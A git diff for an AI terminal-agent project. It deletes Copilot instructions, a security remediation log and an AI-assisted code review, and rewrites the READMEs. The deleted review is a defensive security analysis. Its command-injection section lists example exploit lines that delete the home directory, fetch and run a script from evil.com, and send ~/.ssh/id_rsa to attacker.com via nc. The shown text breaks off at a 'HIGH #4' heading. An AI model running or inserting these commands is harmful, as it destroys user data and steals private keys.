diff --git a/.github/copilot-instructions.md b/.github/copilot-instructions.md
deleted file mode 100644
index fc6f44d..0000000
--- a/.github/copilot-instructions.md
+++ /dev/null
@@ -1,56 +0,0 @@
-# Copilot Instructions for Warp CLI
-
-This project is a standalone CLI AI agent for personal use, designed to run in any terminal and leverage both local and cloud LLMs for coding and system tasks.
-
-## Architecture & Key Patterns
-
-- **Service-Oriented Structure:**
-  - `warp-cli/src/services/` contains core logic for chat, context, config, and session management.
-  - `warp-cli/src/providers/` implements LLM integrations (OpenAI, Anthropic, Gemini, Ollama) using a common provider interface (`base.provider.ts`).
-  - `warp-cli/src/ui/renderer.ts` handles terminal UI and user interaction.
-- **Session & Context Awareness:**
-  - Persistent session storage is managed in `warp-cli/storage/session.storage.ts` (SQLite-backed).
-  - The agent automatically detects project type, git status, command history, and working directory, surfacing this context to the AI for smarter responses.
-- **Provider Pattern:**
-  - All LLMs are implemented as providers extending a base interface, making it easy to add new models.
-  - Providers are registered in `warp-cli/src/providers/index.ts`.
-
-## Developer Workflows
-
-- **Build & Test:**
-  - `npm run dev` ‚Äî Development mode
-  - `npm run build` ‚Äî Production build
-  - `npm test` ‚Äî Run tests
-- **CLI Development:**
-  - Use `npm link` in `warp-cli` for global CLI access during development.
-- **Configuration:**
-  - AI provider settings are managed via JSON config files or CLI prompts.
-  - See `warp-cli/README.md` for example configs and usage.
-
-## Project-Specific Conventions
-
-- **Context-First AI:**
-  - Always surface relevant project, git, and session context to the AI before generating responses.
-- **Session Management:**
-  - Sessions are persistent and can be exported as JSON or Markdown.
-- **Command Execution:**
-  - The agent can execute shell/system commands and analyze outputs as part of its workflow.
-- **Testing:**
-  - Tests are co-located in `warp-cli` and use standard Node.js/TypeScript testing tools.
-
-## Key Files & Directories
-
-- `warp-cli/src/cli.ts` ‚Äî CLI entry point
-- `warp-cli/src/providers/` ‚Äî LLM provider implementations
-- `warp-cli/src/services/` ‚Äî Core services (chat, config, context, session)
-- `warp-cli/src/ui/renderer.ts` ‚Äî Terminal UI logic
-- `warp-cli/storage/session.storage.ts` ‚Äî Persistent session storage
-
-## Example: Adding a New LLM Provider
-1. Implement a new provider in `warp-cli/src/providers/` extending `base.provider.ts`.
-2. Register it in `warp-cli/src/providers/index.ts`.
-3. Update configuration and add tests as needed.
-
----
-
-For more, see `warp-cli/README.md`.
diff --git a/README.md b/README.md
index 5e1d4a5..167a363 100644
--- a/README.md
+++ b/README.md
@@ -1,137 +1,58 @@
-# AI CLI Suite
-
-AI CLI is a two-part toolkit that brings production-ready AI assistance to any terminal. Run the standalone Warp CLI agent when you need a secure, provider-agnostic chatbot in every shell, or load the Tabby AI Agent when you want MCP-enhanced workflows directly inside Tabby.
-
----
-
-## Why It Matters
-
-| Developer Pain Point | AI CLI Advantage |
-| --- | --- |
-| Need an AI pair-programmer that works across remote/local terminals | Warp CLI ships as a portable CLI, supports local (Ollama) and cloud providers, and keeps context in encrypted SQLite. |
-| Want AI help injected into Tabby with MCP tooling | Tabby AI Agent adds SMART/AI/SHELL modes, MCP orchestration, and context-aware replies without leaving the app. |
-| Security/compliance demands | Keytar-backed secrets, sanitized errors, filtered env vars, zod validation, rate limiting, and AES-256-GCM session encryption. |
-| Terminal UX fatigue | Gradient prompts, syntax-highlighted markdown/code blocks, plugin hooks, context attachments, diff view, undo, autocomplete, and streaming output. |
-
----
-
-## Components
-
-### Warp CLI (`warp-cli/`)
-Warp-inspired CLI agent wired through a dependency-injected core.
-
-- **Multi-LLM chat:** Ollama, OpenAI, Anthropic, Gemini with streaming and live provider switching.
-- **Context intelligence:** Git status, project detection, command history, optional file attachments, and auto-generated system prompts.
-- **Encrypted session engine:** Persistent, searchable, exportable sessions stored in AES-256-GCM‚Äìencrypted SQLite with autosave.
-- **Security tooling:** zod config schemas, rate limiting (`bottleneck`), secure API key vault (`keytar`), structured errors, sanitized outputs, and hardened `/exec`.
-- **CLI UX:** Gradient welcome screen, tables/boxes, syntax-highlighting, `/ctxfile` manager, `/diff`, `/plugins`, `/plugin`, `/undo`, `/autocomplete`, `/stats`, `/export`, and more.
-- **Plugin surface:** Built-in context digest plugin plus support for external JS plugins placed in `~/.warp-cli/plugins`.
-
-### Tabby AI Agent (`tabby-ai-agent/`)
-Plugin that embeds AI capabilities into Tabby.
-
-- **SMART/AI/SHELL modes:** Mode switching via `\\ai`, `\\shell`, `\\toggle`, with automatic detection in SMART mode.
-- **MCP orchestration:** Manage multiple MCP servers, priorities, and health metrics from one UI.
-- **Context awareness:** Detect project types, git state, history, working directory, and feed that into the AI.
-- **Accessibility:** Keyboard-first navigation, high-contrast support, and ARIA-friendly components.
-
----
-
-## Feature Matrix
-
-| Capability | Warp CLI | Tabby Plugin |
-| --- | --- | --- |
-| Multi-provider chat | ‚úÖ | ‚úÖ |
-| Secure key storage (keytar) | ‚úÖ | ‚úÖ |
-| zod config validation | ‚úÖ | ‚úÖ |
-| Structured error handling & sanitization | ‚úÖ | ‚úÖ |
-| Session persistence + encryption | ‚úÖ | ‚úÖ |
-| Git/project/command context | ‚úÖ | ‚úÖ |
-| Context file attachments & diff viewer | ‚úÖ | ‚Äî |
-| Plugin system & autocomplete | ‚úÖ | ‚Äî |
-| MCP server management | ‚Äî | ‚úÖ |
-| SMART/AI/SHELL terminal modes | ‚Äî | ‚úÖ |
-
----
-
-## Security & Reliability Highlights (Warp CLI)
-
-- **RCE guardrails:** `/exec` uses a strict whitelist plus `execFile` and optional confirmations for sensitive commands.
-- **Secret hygiene:** API keys migrate to keytar, env vars filtered before persistence, and errors sanitized to redact tokens.
-- **Config integrity:** zod schemas enforce structure on load/import/set operations; invalid configs fail fast.
-- **Rate limiting:** `bottleneck` enforces per-provider throttling to avoid quota spikes.
-- **Encrypted storage:** Session context + metadata encrypted with AES-256-GCM and managed keys.
-- **Dependency injection:** `container.ts` wires services through constructors to simplify audits/tests.
-
-Track remediation progress in `SECURITY-REMEDIATION-LOG.md`.
-
----
-
-## Repository Layout
-
-```
-aicli/
-‚îú‚îÄ‚îÄ README.md                # This overview
-‚îú‚îÄ‚îÄ warp-cli/                # Standalone CLI agent
-‚îÇ   ‚îú‚îÄ‚îÄ src/
-‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ cli.ts          # Entry point
-‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ commands/       # Slash command handlers
-‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ providers/      # LLM provider implementations
-‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ services/       # Config, context, chat, session, plugin, autocomplete
-‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ storage/        # SQLite persistence + encryption
-‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ ui/             # Renderer utilities
-‚îÇ   ‚îî‚îÄ‚îÄ EXAMPLES.md
-‚îî‚îÄ‚îÄ tabby-ai-agent/          # Tabby plugin with MCP support
-    ‚îú‚îÄ‚îÄ src/
-    ‚îÇ   ‚îú‚îÄ‚îÄ plugin.ts
-    ‚îÇ   ‚îú‚îÄ‚îÄ services/
-    ‚îÇ   ‚îî‚îÄ‚îÄ components/
-    ‚îî‚îÄ‚îÄ config-schema.json
-```
-
----
-
-## Quick Start
-
-```bash
-# Warp CLI
-cd warp-cli
-npm install
-npm run build
-npm link        # optional; exposes `warp` globally
-warp setup      # select provider + configure API keys/endpoints
-warp            # start chatting
-
-# Tabby AI Agent
-cd tabby-ai-agent
-npm install
-npm run build
-# copy or symlink dist output into Tabby‚Äôs plugin directory, then restart Tabby
-```
-
----
-
-## Development Scripts
-
-```bash
-# Warp CLI
-npm run dev      # ts-node dev loop
-npm run build    # compile TypeScript
-npm test         # (tests incoming)
-
-# Tabby plugin
-npm run build
-npm test
-```
-
----
-
-## Contributing & Support
-
-1. Fork ‚Üí feature branch ‚Üí PR (include tests/docs where sensible).
-2. Discuss ideas or issues at https://github.com/harryneopotter/aicli/issues.
-3. Component-specific docs live in `warp-cli/README.md` and `tabby-ai-agent/README.md`.
-
-**License:** MIT
-
-Built with ‚ù§Ô∏è for developers who live in the terminal.
+# AI CLI - Tabby AI Agent Plugin
+
+## Overview
+
+This project, `aicli`, contains the `tabby-ai-agent` plugin for Tabby, an AI-assisted terminal integration. It enables natural language processing in the terminal, leveraging Model Context Protocol (MCP) servers for enhanced functionality like context management and AI interactions (e.g., with Ollama or Gemini API).
+
+Key features:
+- Intercepts terminal input to distinguish commands from natural language queries.
+- Builds dynamic system prompts with context (e.g., working directory, git status).
+- Integrates MCP tools for advanced operations.
+- Modular services for AI agent logic, context management, and MCP client handling.
+
+## Installation
+
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/harryneopotter/aicli.git
+   cd aicli
+   ```
+
+2. Install dependencies in `tabby-ai-agent`:
+   ```bash
+   cd tabby-ai-agent
+   npm install
+   ```
+
+3. Install MCP servers:
+   ```bash
+   node scripts/install-mcp-servers.js
+   ```
+
+4. Build the plugin:
+   ```bash
+   npm run build
+   ```
+
+5. Integrate with Tabby: Follow Tabby's plugin installation guide to add the built plugin.
+
+## Usage
+
+- Open a terminal in Tabby.
+- Type natural language queries (e.g., "What's my current directory?")‚Äîthe AI agent will respond.
+- Regular commands are executed normally.
+- Configure AI models and API keys in relevant services.
+
+## Development
+
+- Source code is in `tabby-ai-agent/src/`.
+- Build with `npm run build` (uses Webpack).
+- For fixes and improvements, see `tabby-ai-agent/PLAN.md`.
+
+## Contributing
+
+Contributions welcome! Fork the repo, create a branch, and submit a PR.
+
+## License
+
+MIT License (add details if needed).
\ No newline at end of file
diff --git a/README_PROJECT.md b/README_PROJECT.md
new file mode 100644
index 0000000..fefdfe4
--- /dev/null
+++ b/README_PROJECT.md
@@ -0,0 +1,148 @@
+# AI CLI - Complete AI Coding Assistant Suite
+
+This repository contains two powerful AI coding assistants:
+
+## 1. Warp CLI - Standalone CLI Coding Agent
+
+**Location:** `/warp-cli`
+
+A complete, standalone CLI-based coding agent similar to Warp.dev with support for multiple LLM providers.
+
+### Key Features:
+- ‚úÖ Multi-LLM support (Ollama, OpenAI, Anthropic, Gemini)
+- ‚úÖ Persistent session storage with SQLite
+- ‚úÖ Smart context awareness (Git, project detection, command history)
+- ‚úÖ Beautiful Warp-inspired terminal UI
+- ‚úÖ Command execution and shell integration
+- ‚úÖ Session management and search
+- ‚úÖ Streaming responses
+- ‚úÖ Export sessions as JSON or Markdown
+
+**[Full Documentation ‚Üí](warp-cli/README.md)**
+
+### Quick Start:
+```bash
+cd warp-cli
+npm install
+npm run build
+npm link
+warp setup
+warp
+```
+
+---
+
+## 2. Tabby AI Agent Plugin
+
+**Location:** `/tabby-ai-agent`
+
+A plugin for the Tabby terminal that integrates AI capabilities with MCP (Model Context Protocol) support.
+
+### Key Features:
+- Tabby terminal integration
+- MCP server support
+- Multi-mode operation (Smart, AI, Shell)
+- Context-aware AI responses
+
+**[Full Documentation ‚Üí](tabby-ai-agent/README.md)**
+
+---
+
+## Project Structure
+
+```
+aicli/
+‚îú‚îÄ‚îÄ warp-cli/              # Standalone CLI application
+‚îÇ   ‚îú‚îÄ‚îÄ src/
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ cli.ts         # Main entry point
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ commands/      # Command handlers
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ providers/     # LLM provider implementations
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ services/      # Core services
+‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ storage/       # Session storage
+‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ ui/            # Terminal UI
+‚îÇ   ‚îú‚îÄ‚îÄ README.md
+‚îÇ   ‚îú‚îÄ‚îÄ EXAMPLES.md
+‚îÇ   ‚îî‚îÄ‚îÄ package.json
+‚îÇ
+‚îî‚îÄ‚îÄ tabby-ai-agent/        # Tabby plugin
+    ‚îú‚îÄ‚îÄ src/
+    ‚îÇ   ‚îú‚îÄ‚îÄ plugin.ts      # Plugin entry
+    ‚îÇ   ‚îú‚îÄ‚îÄ services/      # AI and MCP services
+    ‚îÇ   ‚îî‚îÄ‚îÄ components/    # UI components
+    ‚îú‚îÄ‚îÄ README.md
+    ‚îî‚îÄ‚îÄ package.json
+```
+
+## Which Should I Use?
+
+### Use **Warp CLI** if you want:
+- A standalone, ready-to-use AI coding assistant
+- Support for multiple LLM providers
+- Session management and persistence
+- Works in any terminal
+
+### Use **Tabby AI Agent** if you want:
+- Deep integration with Tabby terminal
+- MCP server capabilities
+- Plugin-based extensibility
+
+---
+
+## Development
+
+### Warp CLI Development
+```bash
+cd warp-cli
+npm install
+npm run dev          # Run in development mode
+npm run build        # Build for production
+npm test             # Run tests
+```
+
+### Tabby AI Agent Development
+```bash
+cd tabby-ai-agent
+npm install
+npm run build        # Build plugin
+npm test             # Run tests
+```
+
+## Contributing
+
+Contributions are welcome! Please:
+
+1. Fork the repository
+2. Create a feature branch
+3. Make your changes
+4. Add tests if applicable
+5. Submit a pull request
+
+## License
+
+MIT License - see LICENSE file for details
+
+## Support
+
+- GitHub Issues: https://github.com/harryneopotter/aicli/issues
+- Documentation: See individual project READMEs
+
+---
+
+## Roadmap
+
+### Warp CLI
+- [ ] Plugin system
+- [ ] File context loading
+- [ ] Code analysis tools
+- [ ] Custom themes
+- [ ] Voice input support
+
+### Tabby AI Agent
+- [ ] Complete MCP integration
+- [ ] Enhanced context management
+- [ ] Multi-model support
+- [ ] Improved error handling
+
+---
+
+Made with ‚ù§Ô∏è by the AI CLI Team
diff --git a/SECURITY-REMEDIATION-LOG.md b/SECURITY-REMEDIATION-LOG.md
deleted file mode 100644
index 2bf3dfa..0000000
--- a/SECURITY-REMEDIATION-LOG.md
+++ /dev/null
@@ -1,81 +0,0 @@
-# Remediation Summary (as of 2025-11-18)
-
-- [x] [Error Hierarchy] Added structured error classes (`AICliError`, `CommandExecutionError`, `ProviderError`) for consistent error handling (`errors.ts`).
-- [x] [Config Validation] Added `zod`-based schema validation for config on load, import, and individual updates (`config.service.ts`).
-- [x] [Env Filtering] Only a safe subset of environment variables is now persisted to session context (`session.service.ts`).
-- [x] [Error Sanitization] Added `sanitizeError` utility to redact secrets from error messages in command execution (`context.service.ts`).
-- [x] [RCE Fix] Replaced `exec/execAsync` with `execFile`, added command whitelist, and user confirmation for dangerous commands in `context.service.ts`.
-- [x] [API Key Security] Added `SecureConfigService` using `keytar` for OS-native API key storage. Provider config now uses secure storage.
-- [x] [Rate Limiting] Implemented per-provider rate limiting using `bottleneck`.
-- [x] [Session Encryption] Added AES-256-GCM encryption with managed keys for session context and metadata at rest (`session.storage.ts`, `utils/encryption.ts`).
-- [x] [Dependency Injection] Introduced a composition container to wire services via constructor injection, removing implicit singletons (`container.ts`, service constructors).
-- [x] [UI Enhancements] Upgraded the terminal renderer with gradients, syntax-highlighted markdown/code blocks, and improved prompts (`ui/renderer.ts`).
-
-# Warp CLI Security Remediation Log
-
-**Start Date:** 2025-11-18
-
----
-
-## Current Status (as of 2025-11-18)
-
-- **Critical security vulnerabilities present:**
-  - [x] RCE via `/exec` (no command whitelist, uses exec/execAsync) ‚Äî **Fixed**
-  - [x] API keys stored in plaintext config ‚Äî **Fixed**
-  - [x] No error sanitization (secrets may leak in errors) ‚Äî **Fixed**
-  - [x] All environment variables persisted (including secrets) ‚Äî **Fixed**
-  - [x] No config or input validation (zod/io-ts) ‚Äî **Fixed**
-  - [x] No structured error hierarchy ‚Äî **Fixed**
-  - [x] No rate limiting ‚Äî **Fixed**
-  - [x] No session encryption ‚Äî **Fixed**
-  - [x] No dependency injection ‚Äî **Fixed**
-  - [ ] No unit/integration/security tests
-  - [ ] No CI/CD or audit pipeline
-  - [ ] No JSDoc or architecture docs
-
----
-
-## Next Steps (Planned Remediation)
-
-### 1. üî¥ Immediate Security Fixes
-- [x] Fix RCE in `/exec` (whitelist, execFile, confirmation)
-- [x] Secure API key storage with `keytar`
-- [x] Sanitize error messages (redact secrets)
-- [x] Filter environment variables (only safe vars persisted)
-
-### 2. üü° High Priority
-- [x] Add config & input validation (`zod`/`io-ts`)
-- [x] Structured error handling (`AICliError` hierarchy)
-- [ ] Add security & core unit tests
-- [x] Add rate limiting per provider
-
-### 3. üü¢ Medium Priority
-- [x] Session encryption at rest
-- [x] Refactor to dependency injection
-- [ ] Add JSDoc, troubleshooting, and architecture docs
-- [ ] Set up CI/CD, audit, and coverage
-
-### 4. üîµ Feature & UX Improvements
-- [x] Plugin system, context file loading, diff view, undo, autocomplete, etc.
-
----
-
-## Remediation Log
-
-_This section will be updated as changes are made._
-
----
-
-**2025-11-18**
-- Initial remediation log created. Status and next steps documented.
-- [RCE] Replaced exec/execAsync with execFile, added command whitelist, and user confirmation for dangerous commands in context.service.ts. First critical security issue addressed.
-- [API Key Security] Added SecureConfigService using keytar for OS-native API key storage. Provider config now uses secure storage.
-- [Error Sanitization] Added sanitizeError utility to redact secrets from error messages in command execution (context.service.ts).
-- [Env Filtering] Only a safe subset of environment variables is now persisted to session context (session.service.ts).
-- [Config Validation] Added zod-based schema validation for config on load, import, and individual updates (config.service.ts).
-- [Error Hierarchy] Added structured error classes (AICliError, CommandExecutionError, ProviderError) for consistent error handling (errors.ts).
-- [Rate Limiting] Implemented per-provider rate limiting using bottleneck.
-- [Session Encryption] Added AES-256-GCM encryption with persisted keys for session data at rest (session.storage.ts, utils/encryption.ts).
-- [Dependency Injection] Added a lightweight container that composes Config, Context, Session, Chat, UI, and Command services via constructor injection (container.ts, service constructors).
-- [UI/UX] Upgraded terminal output with gradients, syntax highlighting, themed prompts, and formatted code blocks (ui/renderer.ts).
-- [UI/UX] Added plugin system with built-in context digest plugin plus external loader, context file attachments, git diff viewer, undo command, and command autocomplete suggestions (plugin.service.ts, context.service.ts, session.service.ts, commands/handlers.ts, ui/renderer.ts).
diff --git a/critical-review.md b/critical-review.md
deleted file mode 100644
index 08ae9fe..0000000
--- a/critical-review.md
+++ /dev/null
@@ -1,1332 +0,0 @@
-# AI CLI - Comprehensive Code Review
-
-> ‚ö†Ô∏è **HISTORICAL REVIEW NOTICE**  
-> This review reflects the codebase state as of **2025-11-17**, **before security remediation was applied**.  
-> All critical vulnerabilities documented below have been **fixed** as of 2025-11-18.  
-> See [SECURITY-REMEDIATION-LOG.md](SECURITY-REMEDIATION-LOG.md) for remediation details.
-
-**Review Date:** 2025-11-17
-**Reviewer:** Claude (AI-assisted Security & Quality Analysis, with human oversight)
-**Scope:** Complete codebase analysis (Warp CLI + Tabby AI Agent)
-
----
-
-## Executive Summary
-
-**Overall Assessment:** This is a **well-architected, feature-rich AI coding assistant** with solid design patterns and good developer experience. However, it had **critical security vulnerabilities** that have been addressed through the remediation work documented in SECURITY-REMEDIATION-LOG.md (2025-11-18).
-
-### Strengths ‚úÖ
-- Excellent architecture with clean separation of concerns
-- Strong TypeScript usage with strict mode
-- Multi-provider support (Ollama, OpenAI, Anthropic, Gemini)
-- Beautiful CLI UI with streaming support
-- Comprehensive session management with SQLite + FTS
-- MCP integration for extensibility
-- Good code organization and modularity
-
-### Critical Issues ‚ö†Ô∏è
-- **3 Critical Security Vulnerabilities** (RCE, API key exposure)
-- **5 High Severity Security Issues**
-- Limited test coverage
-- Missing documentation in key areas
-- No secrets management system
-- No encryption at rest
-
-### Risk Level
-üü¢ **REMEDIATED** - All critical security vulnerabilities have been addressed (as of 2025-11-18). See [SECURITY-REMEDIATION-LOG.md](SECURITY-REMEDIATION-LOG.md) for details.
-
----
-
-## 1. CODE QUALITY REVIEW
-
-### 1.1 Architecture & Design Patterns ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ (4/5)
-
-#### Excellent Patterns Used:
-1. **Strategy Pattern** - LLM provider abstraction
-   ```typescript
-   // Clean abstraction allows easy provider switching
-   abstract class BaseLLMProvider implements LLMProvider
-   class OllamaProvider extends BaseLLMProvider
-   class OpenAIProvider extends BaseLLMProvider
-   ```
-
-2. **Service Locator** - Singleton service instances
-   ```typescript
-   export const chatService = new ChatService()
-   export const sessionService = new SessionService()
-   ```
-
-3. **Repository Pattern** - Data persistence abstraction
-   ```typescript
-   class SessionStorage implements StorageProvider
-   ```
-
-4. **Decorator Pattern** (Tabby) - Terminal decoration
-   ```typescript
-   class AIAgentTerminalDecorator extends TerminalDecorator
-   ```
-
-5. **Factory Pattern** - Provider instantiation
-   ```typescript
-   class ProviderFactory {
-     async getProvider(config: LLMConfig): Promise<LLMProvider>
-   }
-   ```
-
-#### Issues:
-- ‚ùå **Global singletons** - Makes testing difficult
-- ‚ùå **Tight coupling** - Services directly reference each other instead of dependency injection
-- ‚ùå **No interfaces** - Abstract classes used but missing interface contracts
-- ‚ö†Ô∏è **Mixed concerns** - UI rendering logic mixed with business logic in some places
-
-**Recommendation:** Implement proper dependency injection (use `tsyringe` or similar).
-
----
-
-### 1.2 TypeScript Usage ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ (4/5)
-
-#### Strengths:
-- ‚úÖ Strict mode enabled (`tsconfig.json`)
-- ‚úÖ Comprehensive type definitions in `types.ts`
-- ‚úÖ No `any` abuse (mostly)
-- ‚úÖ Proper async/await usage
-- ‚úÖ Type-safe configuration management
-
-#### Issues:
-```typescript
-// ‚ùå Type casting without validation
-const exportFormat = (format as 'json' | 'markdown') || 'json';
-
-// ‚ùå Type assertion on dynamic data
-(providerConfig as any).model = name;
-
-// ‚ùå Loose error typing
-} catch (error: any) {
-  // Should be: catch (error: unknown)
-```
-
-**Recommendations:**
-1. Replace `any` with `unknown` and use type guards
-2. Add runtime validation with `zod` or `io-ts`
-3. Use branded types for sensitive data (API keys, session IDs)
-4. Add exhaustiveness checking for switch statements
-
----
-
-### 1.3 Error Handling ‚≠ê‚≠ê‚≠ê‚òÜ‚òÜ (3/5)
-
-#### Current Approach:
-```typescript
-try {
-  await someOperation();
-} catch (error: any) {
-  throw new Error(`Operation failed: ${error.message}`);
-}
-```
-
-#### Issues:
-- ‚ùå Error details leaked to users (security risk)
-- ‚ùå No structured error types
-- ‚ùå No error recovery strategies
-- ‚ùå Stack traces exposed in production
-- ‚ö†Ô∏è Silent failures in some places
-
-**Recommendations:**
-```typescript
-// Create error hierarchy
-class AICliError extends Error {
-  constructor(
-    public code: string,
-    message: string,
-    public details?: unknown
-  ) {
-    super(message);
-  }
-}
-
-class CommandExecutionError extends AICliError {}
-class ProviderError extends AICliError {}
-
-// Use structured error handling
-try {
-  await operation();
-} catch (error) {
-  if (error instanceof ProviderError) {
-    logger.error('Provider error', { code: error.code });
-    uiRenderer.renderError('AI service unavailable');
-  }
-}
-```
-
----
-
-### 1.4 Code Organization ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (5/5)
-
-**Excellent structure:**
-```
-warp-cli/src/
-‚îú‚îÄ‚îÄ cli.ts              # Entry point
-‚îú‚îÄ‚îÄ types.ts            # Type definitions
-‚îú‚îÄ‚îÄ commands/           # Command handlers
-‚îú‚îÄ‚îÄ services/           # Business logic
-‚îú‚îÄ‚îÄ providers/          # LLM abstraction
-‚îú‚îÄ‚îÄ storage/            # Data persistence
-‚îî‚îÄ‚îÄ ui/                 # Presentation layer
-```
-
-**Strengths:**
-- ‚úÖ Clear separation of concerns
-- ‚úÖ Logical folder structure
-- ‚úÖ One responsibility per file
-- ‚úÖ Consistent naming conventions
-- ‚úÖ Co-located related code
-
----
-
-### 1.5 Performance ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ (4/5)
-
-#### Strengths:
-- ‚úÖ **Streaming responses** - Memory efficient
-- ‚úÖ **Response caching** (Tabby) - 5min TTL, LRU eviction
-- ‚úÖ **FTS indexing** - Fast session search
-- ‚úÖ **Async operations** - Non-blocking I/O
-- ‚úÖ **Lazy loading** - Providers initialized on demand
-
-#### Performance Metrics (Tabby):
-```typescript
-private performanceMetrics: PerformanceMetrics = {
-  totalRequests: 0,
-  successfulRequests: 0,
-  failedRequests: 0,
-  averageResponseTime: 0,
-  totalTokensUsed: 0
-}
-```
-
-#### Issues:
-- ‚ö†Ô∏è **No connection pooling** for HTTP requests
-- ‚ö†Ô∏è **Unbounded history** - Could grow indefinitely
-- ‚ö†Ô∏è **No rate limiting** - Can overwhelm APIs
-- ‚ö†Ô∏è **Database not optimized** - Missing indexes on frequently queried columns
-
-**Recommendations:**
-1. Add connection pooling for API clients
-2. Implement sliding window for history (done, but could be improved)
-3. Add rate limiting per provider
-4. Add database indexes on `updated`, `created` columns
-
----
-
-## 2. SECURITY ANALYSIS üî¥
-
-### 2.1 Critical Vulnerabilities (CVSS 9.0+)
-
-#### üö® CRITICAL #1: Remote Code Execution via `/exec` [**FIXED** ‚Äî See SECURITY-REMEDIATION-LOG.md]
-**Location:** `warp-cli/src/services/context.service.ts:206-230`
-
-```typescript
-// VULNERABLE CODE
-async executeCommand(command: string): Promise<{ output: string; error?: string }> {
-  const { stdout, stderr } = await execAsync(command, {
-    cwd: process.cwd(),
-    maxBuffer: 1024 * 1024 * 10 // 10MB
-  });
-}
-```
-
-**Exploit:**
-```bash
-warp> /exec; rm -rf ~/*
-warp> /exec $(curl evil.com/malware.sh | bash)
-warp> /exec; cat ~/.ssh/id_rsa | nc attacker.com 1234
-```
-
-**Impact:** Complete system compromise
-**CVSS:** 9.8 (Critical)
-**CWE:** CWE-78 (OS Command Injection)
-
-**Fix:**
-```typescript
-import { execFile } from 'child_process';
-
-// Whitelist allowed commands
-const ALLOWED_COMMANDS = ['git', 'npm', 'ls', 'pwd', 'cat'];
-
-async executeCommand(command: string): Promise<Result> {
-  const [cmd, ...args] = command.trim().split(/\s+/);
-
-  // Validate command
-  if (!ALLOWED_COMMANDS.includes(cmd)) {
-    throw new Error(`Command not allowed: ${cmd}`);
-  }
-
-  // Use execFile with argument array (no shell interpretation)
-  const { stdout, stderr } = await execFile(cmd, args, {
-    cwd: process.cwd(),
-    timeout: 10000,
-    maxBuffer: 1024 * 1024 * 10
-  });
-
-  return { output: stdout, error: stderr };
-}
-```
-
----
-
-#### üö® CRITICAL #2: API Key Exposure in URL [**FIXED** ‚Äî See SECURITY-REMEDIATION-LOG.md]
-**Location:** `warp-cli/src/providers/gemini.provider.ts:16, 73`
-
-```typescript
-// VULNERABLE CODE
-const response = await fetch(
-  `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${apiKey}`,
-  { method: 'POST', ... }
-);
-```
-
-**Risk:**
-- ‚úó API keys logged in proxy logs
-- ‚úó Keys visible in browser history
-- ‚úó Keys captured in network monitoring tools
-- ‚úó Keys exposed in error messages
-
-**Fix:**
-```typescript
-const response = await fetch(
-  `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent`,
-  {
-    method: 'POST',
-    headers: {
-      'Authorization': `Bearer ${apiKey}`,
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({...})
-  }
-);
-```
-
----
-
-#### üö® CRITICAL #3: Plaintext API Key Storage [**FIXED** ‚Äî See SECURITY-REMEDIATION-LOG.md]
-**Location:** Multiple files
-
-**Current:**
-```typescript
-// Config stored in plaintext JSON
-~/.config/warp-cli/config.json
-{
-  "providers": {
-    "openai": { "apiKey": "sk-xxx..." },
-    "anthropic": { "apiKey": "sk-ant-xxx..." }
-  }
-}
-```
-
-**Risk:** Anyone with file system access can steal all API keys
-
-**Fix:** Use OS-native secret storage
-```typescript
-import keytar from 'keytar';
-
-class SecureConfigService {
-  async setApiKey(provider: string, apiKey: string) {
-    await keytar.setPassword('warp-cli', `${provider}-api-key`, apiKey);
-  }
-
-  async getApiKey(provider: string): Promise<string | null> {
-    return await keytar.getPassword('warp-cli', `${provider}-api-key`);
-  }
-}
-```
-
-**Platforms:**
-- macOS: Uses Keychain
-- Windows: Uses Credential Manager
-- Linux: Uses Secret Service API
-
----
-
-### 2.2 High Severity Issues (CVSS 7.0-8.9)
-
-#### ‚ö†Ô∏è HIGH #1: Environment Secrets Leak
-**Location:** `warp-cli/src/services/session.service.ts:128`
-
-```typescript
-// VULNERABLE: Full env saved to database
-context: {
-  ...
-  env: process.env  // Contains ALL API keys!
-}
-```
-
-**Fix:**
-```typescript
-// Only save safe environment variables
-const SAFE_ENV_VARS = ['PATH', 'HOME', 'SHELL', 'USER'];
-
-context: {
-  env: Object.fromEntries(
-    SAFE_ENV_VARS.map(key => [key, process.env[key]])
-  )
-}
-```
-
----
-
-#### ‚ö†Ô∏è HIGH #2: MCP Child Process Injection
-**Location:** `tabby-ai-agent/src/services/mcp-client.service.ts:238-303`
-
-```typescript
-// VULNERABLE: Unsanitized env passed to child processes
-const process = spawn(server.command, server.args, {
-  env: { ...process.env, ...server.env }  // Leaks all secrets!
-});
-```
-
-**Fix:**
-```typescript
-// Create clean environment
-const cleanEnv = {
-  PATH: process.env.PATH,
-  HOME: process.env.HOME,
-  ...server.env  // Only server-specific vars
-};
-
-const childProcess = spawn(server.command, server.args, {
-  env: cleanEnv,
-  stdio: ['pipe', 'pipe', 'pipe']
-});
-```
-
----
-
-#### ‚ö†Ô∏è HIGH #3: Unsafe JSON Deserialization
-**Location:** Multiple locations
-
-```typescript
-// VULNERABLE: No validation
-const config = JSON.parse(configString);
-const session = JSON.parse(sessionRow.context);
-```
-
-**Fix:**
-```typescript
-import { z } from 'zod';
-
-const ConfigSchema = z.object({
-  defaultProvider: z.enum(['ollama', 'openai', 'anthropic', 'gemini']),
-  providers: z.record(z.object({
-    model: z.string(),
-    apiKey: z.string().optional(),
-    endpoint: z.string().url().optional()
-  }))
-});
-
-// Validate before use
-const config = ConfigSchema.parse(JSON.parse(configString));
-```
-
----
-
-#### ‚ö†Ô∏è HIGH #4: MCP Tool Name Injection
-**Location:** `tabby-ai-agent/src/services/ai-agent.service.ts:361-402`
-
-```typescript
